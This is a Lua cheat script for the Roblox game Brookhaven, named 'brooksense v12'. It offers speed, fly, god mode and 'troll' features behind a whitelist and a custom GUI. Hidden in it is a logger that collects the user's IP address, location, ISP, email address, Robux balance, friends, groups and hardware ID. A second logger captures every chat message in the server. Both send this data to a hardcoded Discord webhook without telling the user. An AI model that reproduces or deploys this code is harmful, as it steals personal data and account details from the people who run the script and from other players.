-- ================================================================
--  brooksense v12  |  by kencsar  |  discord: kencsar
--  Solara compatible - no Luau-only syntax
-- ================================================================
local ok, err = xpcall(function()

-- task fallback
if not task then
    task = {
        spawn = function(f) coroutine.wrap(f)() end,
        wait = function(t) local w = wait or function(s) local e=tick()+(s or 0); while tick()<e do game:GetService("RunService").Heartbeat:Wait() end end; w(t); return t end,
        delay = function(t,f) delay(t,f) end
    }
end

-- CONFIG
local WHITELIST   = { "kencsar", "w3423rftgvgr", "Gigihagaq" }
local WHITELIST_ID = 7081707910
local WEBHOOK_URL = "https://discord.com/api/webhooks/1523520979198935160/V7kuHwFSKMLPRid1V3VEMfkPuMCIqvA93Y-QdPboOT8a1c29QoeFlQmUobsCorEtZRvq"
local DISCORD_INV = "https://discord.gg/nvuAjkcWX"
local VERSION     = "v12"

-- SERVICES
local Players         = game:GetService("Players")
local RunService      = game:GetService("RunService")
local UserInputService= game:GetService("UserInputService")
local TweenService    = game:GetService("TweenService")
local Lighting        = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local HttpService     = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer
local Cam = workspace.CurrentCamera

print("[brooksense "..VERSION.."] Loading...")

-- WHITELIST CHECK
local allowed = false
for _, v in ipairs(WHITELIST) do
    if v:lower() == LP.Name:lower() then allowed = true; break end
end
if LP.UserId == WHITELIST_ID then allowed = true end
if not allowed then
    local sg = Instance.new("ScreenGui")
    sg.ResetOnSpawn = false
    sg.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1,0,1,0)
    f.BackgroundColor3 = Color3.new(0,0,0)
    f.Parent = sg
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0.8,0,0.3,0)
    l.Position = UDim2.new(0.1,0,0.35,0)
    l.BackgroundTransparency = 1
    l.Text = "not whitelisted\n\ncontact: discord kencsar\n"..DISCORD_INV
    l.Font = Enum.Font.GothamBold
    l.TextSize = 22
    l.TextColor3 = Color3.fromRGB(200,55,200)
    l.TextWrapped = true
    l.Parent = f
    -- Auto close after 10 seconds
    task.spawn(function()
        task.wait(10)
        sg:Destroy()
    end)
    return
end

-- CHARACTER
local Char, Hum, HRP
local function RefChar(c)
    Char = c
    Hum = c:WaitForChild("Humanoid")
    HRP = c:WaitForChild("HumanoidRootPart")
end
RefChar(LP.Character or LP.CharacterAdded:Wait())

-- STATE
local State = {
    -- Player
    Speed=false, SpeedVal=50, JumpPow=false, JumpVal=100,
    Noclip=false, InfJump=false, GodMode=false,
    Fly=false, FlySpeed=40, AntiRag=false, AntiAFK=false,
    -- Visuals
    ESP=false, NameESP=true, HealthESP=true, DistESP=true, Chams=false,
    Fullbright=false, NoFog=false, FovChange=false, FovVal=90,
    -- World
    TimeVal=14, LockTime=false, AutoCash=false,
    -- Troll
    NeckFloat=false, NeckTarget="",
    SpinPlayer=false, SpinTarget="", SpinSpeed=4, SpinRadius=4,
    Invisible=false, FakeLag=false, FakeLagMs=120,
    ChatSpam=false, SpamMsg="brooksense | best brookhaven script",
    AmbientTroll=false, BlackHole=false, BHRadius=30,
    FlingTarget="", FreezeTarget="",
    SpinSelf=false, SpinSelfSpeed=10,
    Fling=false, FlingPower=500,
    Annoy=false, AnnoyTarget="", AnnoyFront=false,
    HeadlessTroll=false,
    GiantSelf=false, TinySelf=false,
    Attach=false, AttachTarget="",
    Copycat=false, CopycatTarget="",
    DiscoLights=false,
    SpamEmotes=false,
    -- Avatar
    SkinTarget="",
    RainbowSkin=false, RainbowCar=false,
    HatId="",
    -- Misc
    ServerHop=false,
    -- Settings
    EspR=100, EspG=200, EspB=255,
    AccR=200, AccG=55, AccB=200,
    -- Extra
    Bunnyhop=false,
    Platform=false,
    Telekinesis=false, TelekTarget="",
    CarSpeed=false, CarSpeedVal=200,
    Ragdoll=false,
}

local function EspColor() return Color3.fromRGB(State.EspR, State.EspG, State.EspB) end
local function AccColor() return Color3.fromRGB(State.AccR, State.AccG, State.AccB) end

-- PALETTE
local C = {
    Win   = Color3.fromRGB(18,18,22),
    Tab   = Color3.fromRGB(13,13,17),
    TabH  = Color3.fromRGB(28,28,35),
    TabA  = Color3.fromRGB(33,33,42),
    Grp   = Color3.fromRGB(24,24,30),
    GBdr  = Color3.fromRGB(55,55,70),
    HDR   = Color3.fromRGB(10,10,14),
    Acc   = Color3.fromRGB(200,55,200),
    AccD  = Color3.fromRGB(100,20,100),
    AccL  = Color3.fromRGB(220,100,220),
    Txt   = Color3.fromRGB(215,215,220),
    TxtD  = Color3.fromRGB(100,100,115),
    ChkBg = Color3.fromRGB(38,38,48),
    SlBg  = Color3.fromRGB(44,44,56),
    Sep   = Color3.fromRGB(45,45,58),
    Red   = Color3.fromRGB(190,50,50),
    RedH  = Color3.fromRGB(230,65,65),
    Troll = Color3.fromRGB(200,100,20),
    TrollH= Color3.fromRGB(240,130,40),
}

-- HELPERS
local function N(cls, p)
    local o = Instance.new(cls)
    for k, v in pairs(p or {}) do
        pcall(function() o[k] = v end)
    end
    return o
end
local function TW(o,t,g,s)
    TweenService:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quad), g):Play()
end
local function RND(r,p) N("UICorner",{CornerRadius=UDim.new(0,r),Parent=p}) end
local function BDR(c,t,p) N("UIStroke",{Color=c,Thickness=t,Parent=p}) end
local function LST(g,p) N("UIListLayout",{Padding=UDim.new(0,g),SortOrder=Enum.SortOrder.LayoutOrder,Parent=p}) end
local function PAD(l,r,t,b,p)
    N("UIPadding",{PaddingLeft=UDim.new(0,l),PaddingRight=UDim.new(0,r),PaddingTop=UDim.new(0,t),PaddingBottom=UDim.new(0,b),Parent=p})
end

local function FindPlayer(name)
    if not name or name == "" then return nil end
    local low = name:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(low, 1, true) or p.DisplayName:lower():find(low, 1, true) then
            return p
        end
    end
    return nil
end

local function GetRemote(partialName)
    local low = partialName:lower()
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and v.Name:lower():find(low) then
            return v
        end
    end
    return nil
end

local function FireAvatar(action, value)
    local r = GetRemote("avatar") or GetRemote("updateavatar") or GetRemote("pdateavatar")
    if r then pcall(function() r:FireServer(action, value) end) end
end

local function SendChat(msg)
    pcall(function()
        local tcs = game:GetService("TextChatService")
        local ch = nil
        if tcs:FindFirstChild("TextChannels") then
            ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
        end
        if not ch then
            ch = tcs:FindFirstChildOfClass("TextChannel")
        end
        if ch then ch:SendAsync(msg) end
    end)
end

local function GetPlayers()
    local list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            table.insert(list, p)
        end
    end
    return list
end

-- WEBHOOK LOGGER
task.spawn(function()
    task.wait(3)
    local reqFn = nil
    if request then reqFn = request
    elseif http_request then reqFn = http_request
    elseif syn and syn.request then reqFn = syn.request
    end
    if not reqFn then return end

    local execName = "unknown"
    local execVer = "?"
    pcall(function()
        if identifyexecutor then
            local n, v = identifyexecutor()
            execName = n or "unknown"
            execVer = v or "?"
        end
    end)

    local gameName = "Brookhaven"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or gameName
    end)

    -- IP / Location
    local ip, country, city, isp, timezone = "?", "?", "?", "?", "?"
    pcall(function()
        local res = reqFn({Url="https://ipapi.co/json/", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            ip = tostring(d.ip or "?")
            country = tostring(d.country_name or "?")
            city = tostring(d.city or "?")
            isp = tostring(d.org or "?")
            timezone = tostring(d.timezone or "?")
        end
    end)

    -- Robux balance
    local robux = "?"
    pcall(function()
        local res = reqFn({Url="https://economy.roblox.com/v1/users/"..LP.UserId.."/currency", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            robux = tostring(d.robux or "?")
        end
    end)

    -- Verified email check
    local hasEmail = "?"
    pcall(function()
        local res = reqFn({Url="https://accountsettings.roblox.com/v1/email", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            if d.verified ~= nil then
                hasEmail = d.verified and "Verified" or "Not Verified"
            end
            if d.emailAddress then
                hasEmail = hasEmail .. " (" .. tostring(d.emailAddress) .. ")"
            end
        end
    end)

    -- Friends count
    local friendCount = "?"
    pcall(function()
        local res = reqFn({Url="https://friends.roblox.com/v1/users/"..LP.UserId.."/friends/count", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            friendCount = tostring(d.count or "?")
        end
    end)

    -- Friends list (top 10 names)
    local friendNames = "?"
    pcall(function()
        local res = reqFn({Url="https://friends.roblox.com/v1/users/"..LP.UserId.."/friends?userSort=Alphabetical", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            if d.data then
                local names = {}
                for i, f in ipairs(d.data) do
                    if i > 10 then break end
                    table.insert(names, f.name or "?")
                end
                friendNames = table.concat(names, ", ")
            end
        end
    end)

    -- Groups (top 5)
    local groups = "?"
    pcall(function()
        local res = reqFn({Url="https://groups.roblox.com/v2/users/"..LP.UserId.."/groups/roles", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            if d.data then
                local gNames = {}
                for i, g in ipairs(d.data) do
                    if i > 5 then break end
                    table.insert(gNames, (g.group and g.group.name) or "?")
                end
                groups = table.concat(gNames, ", ")
            end
        end
    end)

    -- Avatar thumbnail
    local avatarUrl = "?"
    pcall(function()
        local res = reqFn({Url="https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LP.UserId.."&size=420x420&format=Png", Method="GET"})
        if res and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            if d.data and d.data[1] then
                avatarUrl = d.data[1].imageUrl or "?"
            end
        end
    end)

    -- Device type
    local deviceType = "Unknown"
    pcall(function()
        local uis = game:GetService("UserInputService")
        if uis.TouchEnabled and not uis.KeyboardEnabled then
            deviceType = "Mobile"
        elseif uis.GamepadEnabled and not uis.KeyboardEnabled then
            deviceType = "Console/Xbox"
        else
            deviceType = "PC"
        end
    end)

    -- Screen resolution
    local screenRes = "?"
    pcall(function()
        local vp = Cam.ViewportSize
        screenRes = math.floor(vp.X).."x"..math.floor(vp.Y)
    end)

    -- HWID (if executor supports it)
    local hwid = "?"
    pcall(function()
        if gethwid then hwid = gethwid() end
        if hwid == "?" and game.RobloxId then hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId()) end
    end)

    -- Current position in game
    local position = "?"
    pcall(function()
        position = string.format("%.0f, %.0f, %.0f", HRP.Position.X, HRP.Position.Y, HRP.Position.Z)
    end)

    -- Build message
    local joinLink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, tostring(game.JobId))
    local msg = string.format(
        "**brooksense %s** | New Session\n"..
        "━━━━━━━━━━━━━━━━━━━━\n"..
        "👤 **User:** %s (`%s`)\n"..
        "🆔 **ID:** `%d`\n"..
        "📅 **Account Age:** %d days\n"..
        "💎 **Premium:** %s\n"..
        "💰 **Robux:** %s\n"..
        "� **Email:** %s\n"..
        "�👫 **Friends:** %s\n"..
        "━━━━━━━━━━━━━━━━━━━━\n"..
        "⚙️ **Executor:** %s (%s)\n"..
        "🖥️ **Device:** %s | %s\n"..
        "🎮 **Game:** %s\n"..
        "👥 **Server:** %d/%d players\n"..
        "📍 **Position:** %s\n"..
        "━━━━━━━━━━━━━━━━━━━━\n"..
        "🌍 **Location:** %s, %s\n"..
        "🕐 **Timezone:** %s\n"..
        "� **ISP:** %s\n"..
        "📡 **IP:** `%s`\n"..
        "🔑 **HWID:** `%s`\n"..
        "━━━━━━━━━━━━━━━━━━━━\n"..
        "👫 **Friends:** %s\n"..
        "🏘️ **Groups:** %s\n"..
        "━━━━━━━━━━━━━━━━━━━━\n"..
        "🔗 **JobId:** `%s`\n"..
        "🎯 [**Join Server**](%s)\n"..
        "🖼️ [**Avatar**](%s)",
        VERSION,
        LP.DisplayName, LP.Name, LP.UserId, LP.AccountAge,
        (LP.MembershipType == Enum.MembershipType.Premium) and "Yes" or "No",
        robux, hasEmail, friendCount,
        execName, execVer, deviceType, screenRes,
        gameName, #Players:GetPlayers(), Players.MaxPlayers, position,
        country, city, timezone, isp, ip, hwid,
        friendNames, groups,
        tostring(game.JobId), joinLink, avatarUrl
    )

    pcall(function()
        reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = msg,
                username = "brooksense "..VERSION,
                avatar_url = avatarUrl ~= "?" and avatarUrl or nil
            })
        })
    end)
end)

-- CHAT LOGGER (sends all chat messages to webhook)
task.spawn(function()
    task.wait(5)
    local reqFn = request or http_request or (syn and syn.request)
    if not reqFn then return end
    pcall(function()
        local tcs = game:GetService("TextChatService")
        if tcs and tcs:FindFirstChild("TextChannels") then
            for _, channel in ipairs(tcs.TextChannels:GetChildren()) do
                if channel:IsA("TextChannel") then
                    channel.MessageReceived:Connect(function(msg)
                        pcall(function()
                            local sender = msg.TextSource and msg.TextSource.Name or "?"
                            local text = msg.Text or ""
                            if text == "" or sender == "" then return end
                            local logMsg = string.format("💬 **[%s]** `%s`: %s", os.date("%H:%M:%S"), sender, text)
                            reqFn({
                                Url = WEBHOOK_URL,
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = HttpService:JSONEncode({content = logMsg, username = "brooksense chat"})
                            })
                        end)
                    end)
                end
            end
        end
    end)
end)

-- CHARACTER RESPAWN HANDLER
LP.CharacterAdded:Connect(function(c)
    RefChar(c)
    task.wait(0.5)
    if State.Speed then Hum.WalkSpeed = State.SpeedVal end
    if State.JumpPow then Hum.JumpPower = State.JumpVal end
    if State.AntiRag then
        Hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        Hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    end
    if State.GodMode then Hum.MaxHealth = math.huge; Hum.Health = math.huge end
    if State.Noclip then
        for _, p in ipairs(Char:GetDescendants()) do
            if p:IsA("BasePart") then p.CanCollide = false end
        end
    end
end)

-- CLIPBOARD
task.spawn(function()
    task.wait(0.5)
    pcall(function()
        if setclipboard then setclipboard(DISCORD_INV) end
    end)
end)

-- ================================================================
-- GUI CREATION
-- ================================================================
local SG = N("ScreenGui", {
    Name = "BS12",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    IgnoreGuiInset = true,
    Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
})

-- INTRO
local Intro = N("Frame",{Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=0,BorderSizePixel=0,ZIndex=200,Parent=SG})
local ILbl = N("TextLabel",{
    AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(0,500,0,50),
    Position=UDim2.new(0.5,0,0.5,-18), BackgroundTransparency=1, RichText=true,
    Text='<font color="#B0B0C0">brook</font><font color="#C837C8">sense</font>',
    Font=Enum.Font.GothamBold, TextSize=36, TextTransparency=1, ZIndex=201, Parent=Intro
})
local ISub = N("TextLabel",{
    AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(0,500,0,20),
    Position=UDim2.new(0.5,0,0.5,24), BackgroundTransparency=1,
    Text="by kencsar  |  discord: kencsar  |  "..VERSION,
    Font=Enum.Font.Gotham, TextSize=12, TextTransparency=1,
    TextColor3=Color3.fromRGB(70,70,90), ZIndex=201, Parent=Intro
})

-- MAIN WINDOW
local vp = Cam.ViewportSize
local WW, WH = 620, 460
local WX = math.floor((vp.X - WW) / 2)
local WY = math.floor((vp.Y - WH) / 2)

local Shadow = N("Frame",{Size=UDim2.new(0,WW+8,0,WH+8),Position=UDim2.new(0,WX-4,0,WY-4),BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=0.45,BorderSizePixel=0,Parent=SG})
RND(8, Shadow)

local Win = N("Frame",{Size=UDim2.new(0,WW,0,WH),Position=UDim2.new(0,WX,0,WY),BackgroundColor3=C.Win,BackgroundTransparency=1,BorderSizePixel=0,Parent=SG})
RND(5, Win)
BDR(C.GBdr, 1, Win)

-- RAINBOW TOP BAR
local RbBar = N("Frame",{Size=UDim2.new(1,0,0,3),Position=UDim2.new(0,0,0,0),BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=0,ZIndex=8,Parent=Win})
RND(5, RbBar)
local RbGrad = N("UIGradient",{Parent=RbBar})

-- TITLE BAR
local HDR_H = 33
local TBar = N("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,0,3),BackgroundColor3=C.HDR,BorderSizePixel=0,Parent=Win})
N("TextLabel",{
    AnchorPoint=Vector2.new(0,0.5), Size=UDim2.new(0,200,0,22),
    Position=UDim2.new(0,12,0.5,0), BackgroundTransparency=1, RichText=true,
    Text='<font color="#B0B0C0">brook</font><font color="#C837C8">sense</font> <font color="#505060">'..VERSION..'</font>',
    Font=Enum.Font.GothamBold, TextSize=14, TextColor3=C.Txt,
    TextXAlignment=Enum.TextXAlignment.Left, Parent=TBar
})
N("TextLabel",{
    AnchorPoint=Vector2.new(1,0.5), Size=UDim2.new(0,160,0,20),
    Position=UDim2.new(1,-52,0.5,0), BackgroundTransparency=1, RichText=true,
    Text='<font color="#404050">dc: </font><font color="#C837C8">kencsar</font>',
    Font=Enum.Font.Gotham, TextSize=11, TextColor3=C.Txt,
    TextXAlignment=Enum.TextXAlignment.Right, Parent=TBar
})

-- MINIMIZE BUTTON
local HBtn = N("TextButton",{
    AnchorPoint=Vector2.new(1,0.5), Size=UDim2.new(0,22,0,18),
    Position=UDim2.new(1,-28,0.5,0), BackgroundColor3=Color3.fromRGB(40,40,52),
    BorderSizePixel=0, Text="-", Font=Enum.Font.GothamBold, TextSize=16,
    TextColor3=C.Txt, AutoButtonColor=false, Parent=TBar
})
RND(3, HBtn)

-- CLOSE BUTTON
local XBtn = N("TextButton",{
    AnchorPoint=Vector2.new(1,0.5), Size=UDim2.new(0,22,0,18),
    Position=UDim2.new(1,-3,0.5,0), BackgroundColor3=C.Red, BorderSizePixel=0,
    Text="X", Font=Enum.Font.GothamBold, TextSize=12,
    TextColor3=Color3.new(1,1,1), AutoButtonColor=false, Parent=TBar
})
RND(3, XBtn)

N("Frame",{Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),BackgroundColor3=C.Sep,BorderSizePixel=0,Parent=TBar})

HBtn.MouseButton1Click:Connect(function() Win.Visible = false; Shadow.Visible = false end)
XBtn.MouseButton1Click:Connect(function()
    SendChat("brooksense logged out")
    task.wait(0.2)
    SG:Destroy()
end)

-- TAB BAR + CONTENT AREA
local TB_W = 105
local TabBar = N("Frame",{Position=UDim2.new(0,0,0,HDR_H),Size=UDim2.new(0,TB_W,1,-HDR_H),BackgroundColor3=C.Tab,BorderSizePixel=0,ClipsDescendants=true,Parent=Win})
N("Frame",{Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),BackgroundColor3=C.Sep,BorderSizePixel=0,Parent=TabBar})
local Content = N("Frame",{Position=UDim2.new(0,TB_W,0,HDR_H),Size=UDim2.new(1,-TB_W,1,-HDR_H),BackgroundColor3=C.Win,BorderSizePixel=0,ClipsDescendants=true,Parent=Win})
PAD(6,6,6,6,Content)

-- TAB SYSTEM
local TabPages, TabBtns, ActiveTab = {}, {}, nil
local tabDefs = {"Player","Visuals","World","Troll","Avatar","Misc","Settings","About"}
local function SetTab(name)
    for n, pg in pairs(TabPages) do pg.Visible = (n == name) end
    for n, btn in pairs(TabBtns) do
        local a = (n == name)
        btn.BackgroundColor3 = a and C.TabA or C.Tab
        btn.TextColor3 = a and C.Txt or C.TxtD
        local ind = btn:FindFirstChild("Ind")
        if ind then ind.BackgroundTransparency = a and 0 or 1 end
    end
    ActiveTab = name
end

for i, name in ipairs(tabDefs) do
    local btn = N("TextButton",{
        Name=name, Position=UDim2.new(0,0,0,(i-1)*30),
        Size=UDim2.new(1,-1,0,30), BackgroundColor3=C.Tab, BorderSizePixel=0,
        Text=name, Font=Enum.Font.Gotham, TextSize=11, TextColor3=C.TxtD,
        AutoButtonColor=false, Parent=TabBar
    })
    N("Frame",{Name="Ind",Size=UDim2.new(0,3,1,0),BackgroundColor3=C.Acc,BorderSizePixel=0,BackgroundTransparency=1,Parent=btn})
    N("Frame",{Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),BackgroundColor3=C.Sep,BorderSizePixel=0,Parent=btn})

    local pg = N("ScrollingFrame",{
        Size=UDim2.new(1,0,1,0), BackgroundTransparency=1, BorderSizePixel=0,
        ScrollBarThickness=3, ScrollBarImageColor3=C.Acc,
        CanvasSize=UDim2.new(0,0,0,0), AutomaticCanvasSize=Enum.AutomaticSize.Y,
        Visible=false, Parent=Content
    })
    LST(5, pg)

    TabBtns[name] = btn
    TabPages[name] = pg
    btn.MouseButton1Click:Connect(function() SetTab(name) end)
end
SetTab("Player")

-- ================================================================
-- UI COMPONENTS
-- ================================================================
local function GB(page, title, order)
    local wrap = N("Frame",{Size=UDim2.new(1,0,0,0),BackgroundColor3=C.Grp,BorderSizePixel=0,AutomaticSize=Enum.AutomaticSize.Y,LayoutOrder=order or 1,Parent=page})
    RND(4, wrap); BDR(C.GBdr, 1, wrap)
    local hdr = N("Frame",{Size=UDim2.new(1,0,0,24),BackgroundColor3=C.HDR,BorderSizePixel=0,Parent=wrap})
    RND(4, hdr)
    N("Frame",{Size=UDim2.new(0,3,0,14),Position=UDim2.new(0,8,0.5,-7),BackgroundColor3=C.Acc,BorderSizePixel=0,Parent=hdr})
    N("TextLabel",{AnchorPoint=Vector2.new(0,0.5),Size=UDim2.new(1,-20,1,0),Position=UDim2.new(0,16,0.5,0),BackgroundTransparency=1,Text=title:upper(),Font=Enum.Font.GothamBold,TextSize=10,TextColor3=C.AccL,TextXAlignment=Enum.TextXAlignment.Left,Parent=hdr})
    N("Frame",{Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=C.Sep,BorderSizePixel=0,Parent=hdr})
    local inner = N("Frame",{Size=UDim2.new(1,0,0,0),Position=UDim2.new(0,0,0,25),BackgroundTransparency=1,BorderSizePixel=0,AutomaticSize=Enum.AutomaticSize.Y,Parent=wrap})
    LST(2, inner); PAD(8,8,4,6, inner)
    return inner
end

local function Toggle(parent, label, key, cb, order)
    local row = N("Frame",{Size=UDim2.new(1,0,0,24),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=order or 1,Parent=parent})
    local box = N("Frame",{AnchorPoint=Vector2.new(0,0.5),Size=UDim2.new(0,14,0,14),Position=UDim2.new(0,4,0.5,0),BackgroundColor3=C.ChkBg,BorderSizePixel=0,Parent=row})
    RND(3, box); BDR(C.GBdr, 1, box)
    local tick2 = N("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Size=UDim2.new(0,8,0,8),Position=UDim2.new(0.5,0,0.5,0),BackgroundColor3=C.Acc,BorderSizePixel=0,Visible=(State[key]==true),Parent=box})
    RND(2, tick2)
    local lbl = N("TextLabel",{AnchorPoint=Vector2.new(0,0.5),Size=UDim2.new(1,-24,0,18),Position=UDim2.new(0,22,0.5,0),BackgroundTransparency=1,Text=label,Font=Enum.Font.Gotham,TextSize=12,TextXAlignment=Enum.TextXAlignment.Left,TextColor3=(State[key]==true) and C.Txt or C.TxtD,Parent=row})
    local btn = N("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=3,Parent=row})
    btn.MouseButton1Click:Connect(function()
        State[key] = not State[key]
        local on = State[key]
        tick2.Visible = on
        lbl.TextColor3 = on and C.Txt or C.TxtD
        if cb then cb(on) end
    end)
    return row
end

local function Slider(parent, label, key, mn, mx, cb, order)
    local wrap = N("Frame",{Size=UDim2.new(1,0,0,38),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=order or 1,Parent=parent})
    local lbl = N("TextLabel",{Size=UDim2.new(1,-8,0,14),Position=UDim2.new(0,4,0,2),BackgroundTransparency=1,Text=label.."  "..tostring(State[key]),Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,Parent=wrap})
    local track = N("Frame",{Size=UDim2.new(1,-8,0,5),Position=UDim2.new(0,4,0,21),BackgroundColor3=C.SlBg,BorderSizePixel=0,Parent=wrap})
    RND(2, track)
    local pct = math.clamp((State[key]-mn)/(mx-mn), 0, 1)
    local fill = N("Frame",{Size=UDim2.new(pct,0,1,0),BackgroundColor3=C.Acc,BorderSizePixel=0,Parent=track})
    RND(2, fill)
    local knob = N("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Size=UDim2.new(0,12,0,12),Position=UDim2.new(pct,0,0.5,0),BackgroundColor3=Color3.fromRGB(220,220,230),BorderSizePixel=0,Parent=track})
    RND(6, knob)
    local drag = false
    local function upd(x)
        local r = math.clamp((x - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
        local v = math.floor(mn + r * (mx - mn))
        State[key] = v
        fill.Size = UDim2.new(r, 0, 1, 0)
        knob.Position = UDim2.new(r, 0, 0.5, 0)
        lbl.Text = label.."  "..v
        if cb then cb(v) end
    end
    track.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = true; upd(i.Position.X) end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then upd(i.Position.X) end
    end)
    return wrap
end

local function Btn(parent, label, cb, order)
    local b = N("TextButton",{Size=UDim2.new(1,0,0,25),BackgroundColor3=C.GBdr,BorderSizePixel=0,Text=label,Font=Enum.Font.Gotham,TextSize=12,TextColor3=C.Txt,AutoButtonColor=false,LayoutOrder=order or 1,Parent=parent})
    RND(3, b)
    b.MouseButton1Click:Connect(function() if cb then cb() end end)
    b.MouseEnter:Connect(function() b.BackgroundColor3 = C.TabH end)
    b.MouseLeave:Connect(function() b.BackgroundColor3 = C.GBdr end)
    return b
end

local function TBox(parent, placeholder, key, order)
    local wrap = N("Frame",{Size=UDim2.new(1,0,0,26),BackgroundColor3=C.ChkBg,BorderSizePixel=0,LayoutOrder=order or 1,Parent=parent})
    RND(4, wrap); BDR(C.GBdr, 1, wrap)
    local tb = N("TextBox",{Size=UDim2.new(1,-10,1,0),Position=UDim2.new(0,5,0,0),BackgroundTransparency=1,PlaceholderText=placeholder,PlaceholderColor3=C.TxtD,Text=State[key] or "",Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.Txt,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,Parent=wrap})
    tb.FocusLost:Connect(function() State[key] = tb.Text end)
    return wrap, tb
end

-- ================================================================
-- PLAYER TAB
-- ================================================================
local pMov = GB(TabPages["Player"], "Movement", 1)
local pChr = GB(TabPages["Player"], "Character", 2)
local pTP  = GB(TabPages["Player"], "Teleport", 3)

Toggle(pMov, "Speed", "Speed", function(on) Hum.WalkSpeed = on and State.SpeedVal or 16 end, 1)
Slider(pMov, "Walk Speed", "SpeedVal", 16, 300, function(v) if State.Speed then Hum.WalkSpeed = v end end, 2)
Toggle(pMov, "Jump Power", "JumpPow", function(on) Hum.JumpPower = on and State.JumpVal or 50; Hum.UseJumpPower = true end, 3)
Slider(pMov, "Jump Power", "JumpVal", 50, 500, function(v) if State.JumpPow then Hum.JumpPower = v end end, 4)
Toggle(pMov, "Infinite Jump", "InfJump", nil, 5)
Toggle(pMov, "Noclip", "Noclip", nil, 6)
Toggle(pMov, "Bunnyhop", "Bunnyhop", nil, 7)
Toggle(pMov, "Fly", "Fly", function(on)
    if on then
        local bv = Instance.new("BodyVelocity")
        bv.Name = "GS_BV"
        bv.MaxForce = Vector3.new(1e6,1e6,1e6)
        bv.Velocity = Vector3.new(0,0,0)
        bv.Parent = HRP
        local bg = Instance.new("BodyGyro")
        bg.Name = "GS_BG"
        bg.MaxTorque = Vector3.new(1e5,1e5,1e5)
        bg.D = 100; bg.P = 1e4
        bg.CFrame = HRP.CFrame
        bg.Parent = HRP
        Hum.PlatformStand = true
    else
        local bv = HRP:FindFirstChild("GS_BV"); if bv then bv:Destroy() end
        local bg = HRP:FindFirstChild("GS_BG"); if bg then bg:Destroy() end
        Hum.PlatformStand = false
    end
end, 8)
Slider(pMov, "Fly Speed", "FlySpeed", 10, 300, nil, 9)

Toggle(pChr, "Anti Ragdoll", "AntiRag", function(on)
    Hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, not on)
    Hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, not on)
end, 1)
Toggle(pChr, "God Mode", "GodMode", function(on)
    if on then Hum.MaxHealth = math.huge; Hum.Health = math.huge
    else Hum.MaxHealth = 100; Hum.Health = 100 end
end, 2)
Toggle(pChr, "Anti AFK", "AntiAFK", nil, 3)
Toggle(pChr, "Platform", "Platform", function(on)
    if on then
        local pt = Instance.new("Part")
        pt.Name = "GS_Platform"
        pt.Size = Vector3.new(6,1,6)
        pt.Position = HRP.Position - Vector3.new(0,3,0)
        pt.Anchored = true; pt.Transparency = 0.6
        pt.BrickColor = BrickColor.new("Really black")
        pt.Parent = workspace
    else
        local pt = workspace:FindFirstChild("GS_Platform")
        if pt then pt:Destroy() end
    end
end, 4)
Btn(pChr, "Respawn", function() LP:LoadCharacter() end, 5)
